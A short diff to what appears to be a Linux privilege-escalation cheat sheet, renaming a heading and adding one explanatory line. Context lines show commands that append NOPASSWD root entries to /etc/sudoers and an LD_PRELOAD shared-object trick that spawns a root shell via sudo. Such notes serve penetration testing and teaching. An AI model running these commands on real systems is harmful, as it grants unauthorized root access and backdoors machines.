@@ -744,7 +744,7 @@ openssl passwd -1 -salt hack password123
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-### LD_PRELOAD and NOPASSWD
+### Abusing LD_PRELOAD
 
 ```
 If LD_PRELOAD is explicitly defined in the sudoers file or sudo -l
@@ -765,6 +765,7 @@ void _init() {
     system("/bin/sh");
 }
 
+We can now use this shared object file when launching any program our user can run with sudo:
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
